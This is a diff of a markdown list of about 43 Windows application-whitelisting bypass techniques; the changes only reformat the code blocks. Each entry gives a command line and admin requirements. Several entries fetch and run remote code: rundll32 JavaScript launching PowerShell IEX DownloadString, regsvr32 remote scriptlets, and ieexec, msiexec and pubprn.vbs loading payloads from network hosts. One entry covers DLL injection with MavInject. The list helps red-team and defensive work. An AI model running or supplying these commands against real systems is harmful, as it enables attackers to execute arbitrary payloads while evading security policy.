@@ -18,16 +18,17 @@ Please contribute and do point out errors or resources I have forgotten.
 
 
 ## 1. Rundll32.exe
+```
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
 
-`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"`
+rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
 
-`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");`
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
 
-`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}`
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
 
-`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")`
-
-`rundll32 shell32.dll,Control_RunDLL payload.dll`
+rundll32 shell32.dll,Control_RunDLL payload.dll
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -46,7 +47,9 @@ I only tested on Windows 10 against the default rules, it could work against old
 
 ## 2. Regsvr32.exe
 
-`regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll`
+```
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -63,7 +66,9 @@ I only tested on Windows 10 against the default rules, it could work against old
 
 ## 3. Msbuild.exe
 
-`msbuild.exe pshell.xml`
+```
+msbuild.exe pshell.xml
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -85,8 +90,11 @@ Notes:
 
 ## 4. Regsvcs.exe
 
-`regsvcs.exe /U regsvcs.dll`
-`regsvcs.exe regsvcs.dll`
+```
+regsvcs.exe /U regsvcs.dll
+
+regsvcs.exe regsvcs.dll
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -104,8 +112,11 @@ Notes:
 
 ## 5. Regasm.exe
 
-`regasm.exe /U regsvcs.dll`
-`regasm.exe regsvcs.dll`
+```
+regasm.exe /U regsvcs.dll
+
+regasm.exe regsvcs.dll
+```
 
 * Requires admin: /U does not require admin  
 * Windows binary: Yes  
@@ -123,7 +134,9 @@ Notes:
 
 ## 6. Bginfo.exe
 
-`bginfo.exe bginfo.bgi /popup /nolicprompt`
+```
+bginfo.exe bginfo.bgi /popup /nolicprompt
+```
 
 * Requires admin: No  
 * Windows binary: No  
@@ -141,7 +154,9 @@ Will work if BGinfo.exe is located in a path that is trusted by the policy.
 
 ## 7. InstallUtil.exe
 
-`InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll`
+```
+InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -162,7 +177,9 @@ Notes:
 
 ## 8. MSDT.exe
 
-`Open .diagcab package`
+```
+Open .diagcab package
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -178,7 +195,9 @@ Notes:
 
 ## 9. mshta.exe
 
-`mshta.exe evilfile.hta`
+```
+mshta.exe evilfile.hta
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -194,7 +213,9 @@ Notes:
 
 ## 10. Execute .Bat
 
-`cmd.exe /k < script.txt`
+```
+cmd.exe /k < script.txt
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -210,7 +231,9 @@ Notes:
 
 ## 11. Execute .PS1
 
-`Get-Content script.txt | iex`
+```
+Get-Content script.txt | iex
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -226,7 +249,9 @@ Notes:
 
 ## 12. Execute .VBS
 
-`cscript.exe //E:vbscript script.txt`
+```
+cscript.exe //E:vbscript script.txt
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -242,7 +267,9 @@ Notes:
   
 ## 13. PresentationHost.exe
 
+```
 Missing Example
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -258,7 +285,9 @@ Notes:
 
 ## 14. dfsvc.exe
 
+```
 Missing Example
+```
 
 * Requires admin: ?  
 * Windows binary: Yes  
@@ -274,7 +303,9 @@ Notes:
 
 ## 15. IEExec.exe
 
-`ieexec.exe http://x.x.x.x:8080/bypass.exe`
+```
+ieexec.exe http://x.x.x.x:8080/bypass.exe
+```
 
 * Requires admin: ?  
 * Windows binary: Yes  
@@ -289,7 +320,9 @@ Notes:
 
 ## 16. cdb.exe
 
-`cdb.exe -cf x64_calc.wds -o notepad.exe`
+```
+cdb.exe -cf x64_calc.wds -o notepad.exe
+```
 
 * Requires admin: ?  
 * Windows binary: No  
@@ -304,7 +337,9 @@ Notes:
 
 ## 17. dnx.exe
 
-`dnx.exe consoleapp`
+```
+dnx.exe consoleapp
+```
 
 * Requires admin: ?  
 * Windows binary: No  
@@ -319,7 +354,9 @@ Notes:
 
 ## 18. rcsi.exe
 
-`rcsi.exe bypass.csx`
+```
+rcsi.exe bypass.csx
+```
 
 * Requires admin: ?  
 * Windows binary: No  
@@ -334,7 +371,9 @@ Notes:
 
 ## 19. csi.exe
 
+```
 Missing example
+```
 
 * Requires admin: ?  
 * Windows binary: No  
@@ -350,7 +389,9 @@ Notes:
 
 ## 20. CPL loading location manipulation
 
-`Control.exe`
+```
+Control.exe
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -366,7 +407,9 @@ Notes:
 
 ## 21. msxsl.exe
 
-`msxsl.exe customers.xml script.xsl`
+```
+msxsl.exe customers.xml script.xsl
+```
 
 * Requires admin: No  
 * Windows binary: No  
@@ -384,8 +427,11 @@ Notes:
 
 ## 22. msiexec.exe
 
-`msiexec /quiet /i cmd.msi`
-`msiexec /q /i http://192.168.100.3/tmp/cmd.png`
+```
+msiexec /quiet /i cmd.msi
+
+msiexec /q /i http://192.168.100.3/tmp/cmd.png
+```
 
 * Requires admin: ?  
 * Windows binary: Yes  
@@ -400,7 +446,9 @@ Notes:
 
 ## 23. cmstp.exe
 
-`cmstp.exe /ni /s c:\cmstp\CorpVPN.inf`
+```
+cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -419,7 +467,10 @@ https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80
 
 ## 24. xwizard.exe
 
-`xwizard.exe argument1 argument2`
+```
+xwizard.exe argument1 argument2
+```
+
 DLL loading in same folder xwizard.dll
 
 * Requires admin: No  
@@ -434,7 +485,9 @@ Notes:
 
 ## 25. fsi.exe
 
-`fsi.exe c:\folder\d.fscript`
+```
+fsi.exe c:\folder\d.fscript
+```
 
 * Requires admin: No  
 * Windows binary: No  
@@ -451,7 +504,9 @@ Notes:
 
 ## 26. odbcconf.exe
 
-`odbcconf -f file.rsp`
+```
+odbcconf -f file.rsp
+```
 
 * Requires admin: ?  
 * Windows binary: Yes  
@@ -466,7 +521,9 @@ Notes:
 
 ## 27. te.exe
 
-`te.exe bypass.wsc`
+```
+te.exe bypass.wsc
+```
 
 * Requires admin: No  
 * Windows binary: No  
@@ -484,10 +541,16 @@ Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAE
 ## 28. Placing files in writeable paths under c:\windows
 
 The following folders are by default writable and executable by normal users
-`C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
-`C:\Windows\System32\spool\drivers\color`
-`C:\Windows\Tasks`
-`C:\windows\tracing`
+```
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+
+C:\Windows\System32\spool\drivers\color
+
+C:\Windows\Tasks
+
+C:\windows\tracing
+```
+
 
 * Requires admin: No  
 * Windows binary: N/A  
@@ -499,7 +562,9 @@ Notes: This list is based on Windows 10 1709. Run accesschk to verify on other W
    
 ## 29. Atbroker.exe
 
-`ATBroker.exe /start malware`
+```
+ATBroker.exe /start malware
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -514,10 +579,15 @@ Notes:
    
 ## 30. WMIC.exe
 
-`wmic process call create calc`
-`wmic process get brief /format:"https://www.example.com/file.xsl`
-`wmic os get /format:"MYXSLFILE.xsl"`
-`wmic process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"`
+```
+wmic process call create calc
+
+wmic process get brief /format:"https://www.example.com/file.xsl
+
+wmic os get /format:"MYXSLFILE.xsl"
+
+wmic process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -530,9 +600,13 @@ Notes:
   * https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html   
   * https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl   
    
+   
+      
 ## 31. MavInject32.exe
 
-`MavInject32.exe <PID> /INJECTRUNNING <PATH DLL>`
+```
+MavInject32.exe <PID> /INJECTRUNNING <PATH DLL>
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -548,7 +622,9 @@ Notes:
    
 ## 32. Pubprn.vbs
 
-`pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/api0cradle/fb164762143b1ff4042d9c662171a568/raw/709aff66095b7f60e5d6f456a5e42021a95ca802/test.sct`
+```
+pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/api0cradle/fb164762143b1ff4042d9c662171a568/raw/709aff66095b7f60e5d6f456a5e42021a95ca802/test.sct
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -564,7 +640,9 @@ Notes:
    
 ## 33. slmgr.vbs
 
-`slmgr.vbs`
+```
+slmgr.vbs
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -580,7 +658,9 @@ Notes: Requires registry keys for com object.
    
 ## 34. winrm.vbs
 
-`winrm quickconfig`
+```
+winrm quickconfig
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -596,7 +676,9 @@ Notes: Requires registry keys for com object.
    
 ## 35. forfiles.exe
 
-`forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe`
+```
+forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -611,8 +693,9 @@ Notes:
    
 ## 36. SyncAppvPublishingServer.exe
 
-`SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX
-`
+```
+SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -627,7 +710,9 @@ Notes:
    
 ## 37. InfDefaultInstall.exe
 
-`InfDefaultInstall.exe shady.inf`
+```
+InfDefaultInstall.exe shady.inf
+```
 
 * Requires admin: ?  
 * Windows binary: Yes  
@@ -645,7 +730,9 @@ Only works on Windows 7? Windows 10 requires admin or digital signature
 
 ## 38. Winword.exe
 
-`winword.exe /l dllfile.dll`
+```
+winword.exe /l dllfile.dll
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -660,7 +747,9 @@ Notes: No commonly made DLL example file
    
 ## 39. Runscripthelper.exe
 
-`runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test`
+```
+runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -675,7 +764,9 @@ Notes:
    
 ## 40. Tracker.exe
 
-`Tracker.exe /d .\calc.dll /c C:\Windows\write.exe`
+```
+Tracker.exe /d .\calc.dll /c C:\Windows\write.exe
+```
 
 * Requires admin: No  
 * Windows binary: No  
@@ -692,7 +783,9 @@ Requires TrackerUI.dll present in 1028 subfolder.
    
 ## 41. .WSF files
 
-`script.wsf`
+```
+script.wsf
+```
 
 * Requires admin: No  
 * Windows binary: No  
@@ -707,7 +800,9 @@ Notes:
 
 ## 42. PowerShell version 2
 
-`Powershell -version 2`
+```
+Powershell -version 2
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
@@ -722,8 +817,11 @@ Bypasses Constrained language mode
    
 ## 43. CL_Invocation.ps1
 
-`. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1`
-`SyncInvoke <executable> [args]`
+```
+. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1
+
+SyncInvoke <executable> [args]
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
